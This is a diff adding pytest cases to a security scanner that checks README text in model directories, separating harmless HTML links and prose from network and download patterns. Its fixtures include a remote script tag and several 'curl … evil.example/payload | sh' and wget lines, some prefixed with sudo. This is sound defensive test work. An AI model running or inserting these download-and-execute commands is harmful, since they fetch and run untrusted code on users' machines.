@@ -166,6 +166,41 @@ def test_text_scanner_generic_documentation_url_labels_are_informational(
     assert determine_exit_code(aggregate) == 0
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        '<a href="https://example.com/docs">Documentation</a>\n',
+        "<img src='https://example.com/model.png' alt='Model diagram'>\n",
+        '<a\n  href="https://example.com/docs">Documentation</a>\n',
+    ],
+)
+def test_text_scanner_passive_html_links_are_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_executable_html_resource_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('<script src="https://evil.example/payload.js"></script>\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("Use requests.get to download weights.\n", encoding="utf-8")
@@ -281,6 +316,49 @@ def test_text_scanner_python_prompt_import_prose_remains_informational(tmp_path:
     result = TextScanner().scan(str(text_path))
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- import socket\n",
+        "1. import requests\n",
+        "> import socket\n",
+        "> - >>> import requests\n",
+    ],
+)
+def test_text_scanner_markdown_prefixed_imports_remain_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- import requests before downloading weights.\n",
+        "> import socket for troubleshooting examples.\n",
+    ],
+)
+def test_text_scanner_markdown_prefixed_import_prose_is_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
@@ -459,6 +537,9 @@ def test_text_scanner_privilege_wrapper_prose_remains_informational(tmp_path: Pa
     [
         "HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
         "env HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload\n",
+        "sudo HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
+        "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload\n",
+        "sudo env HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
     ],
 )
 def test_text_scanner_env_prefixed_documentation_downloads_remain_actionable(
